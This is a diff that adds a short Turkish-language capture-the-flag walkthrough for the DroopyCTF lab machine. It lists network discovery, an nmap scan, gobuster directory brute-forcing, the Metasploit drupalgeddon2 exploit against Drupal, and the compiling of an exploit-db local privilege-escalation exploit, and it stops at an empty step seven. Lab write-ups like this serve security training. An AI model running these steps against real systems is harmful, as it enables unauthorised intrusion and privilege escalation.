@@ -1,0 +1,8 @@
+DROOPYCTF MAKİNE ÇÖZÜMÜ
+1 - arp-scan --localnet ile IP adresi 192.168.2.114 bulundu.
+2 - nmap -sT -A 192.168.2.114
+3 - gobuster dir -u http://192.168.2.114 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+4 - msfconsole, search drupal, use exploit/unix/webapp/drupal_drupalgeddon2
+5 - https://www.exploit-db.com/exploits/37292
+6 - gcc -o shell 37292.c
+7 - 
